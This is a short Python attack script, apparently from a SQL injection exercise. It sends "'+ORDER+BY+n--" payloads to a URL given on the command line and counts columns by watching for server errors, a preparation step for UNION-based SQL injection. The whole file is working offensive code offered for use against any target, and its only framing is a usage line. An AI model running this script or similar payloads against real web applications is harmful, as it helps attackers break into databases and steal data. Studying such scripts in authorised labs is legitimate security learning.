#!/usr/bin/env python3
import requests
import sys

def exploit(url, payload):
    for i in range(1,int(payload)):
        sqli = f"'+ORDER+BY+{i}--"
        req = requests.get(url + sqli)
        if "Internal Server Error" in req.text:
            return i-1
        i = i+1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[*] Usage: {} <url> <payload>".format(sys.argv[0]))
        print('[*] Example: {} http://example.com 10'.format(sys.argv[0]))
        sys.exit(1)

    print("[*] Figuring out number of columns...")
    num_col = exploit(url, payload)
    if num_col:
        print("[*] The number of columns is {}".format(num_col))
    else:
        print("[*] SQLi UNION not successful")
